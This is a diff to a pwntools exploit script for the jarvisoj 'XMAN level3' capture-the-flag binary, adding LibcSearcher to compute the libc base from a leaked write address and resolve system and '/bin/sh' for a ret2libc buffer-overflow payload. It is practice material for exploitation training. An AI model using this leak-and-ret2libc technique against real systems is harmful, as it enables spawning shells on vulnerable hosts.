@@ -1,3 +1,4 @@
+from LibcSearcher import LibcSearcher
 from pwn import *
 
 
@@ -37,11 +38,18 @@ def x_man_level3(file_name='/mnt/hgfs/CyberSecurity/PWN/jarvisoj/level3/[XMAN]le
     print("system_libc_addr: %x" % system_libc_addr)
     print("bin_sh_libc_addr: %x" % bin_sh_libc_addr)
 
+    searcher = LibcSearcher('write', write_addr)
+    libc_base = write_addr - searcher.dump('write')
+    system_addr_s = libc_base + searcher.dump('system')
+    bin_sh_addr_s = libc_base + searcher.dump('str_bin_sh')
+
     system_addr = p32(write_addr - (write_libc_addr - system_libc_addr))
     bin_sh_addr = p32(write_addr + (bin_sh_libc_addr - write_libc_addr))
 
     print("system_addr: %x" % (write_addr - (write_libc_addr - system_libc_addr)))
     print("bin_sh_addr: %x" % (write_addr + (bin_sh_libc_addr - write_libc_addr)))
+    print("system_addr_s: %x" % system_addr_s)
+    print("bin_sh_addr_s: %x" % bin_sh_addr_s)
 
     payload_2 = b'A' * 140
 
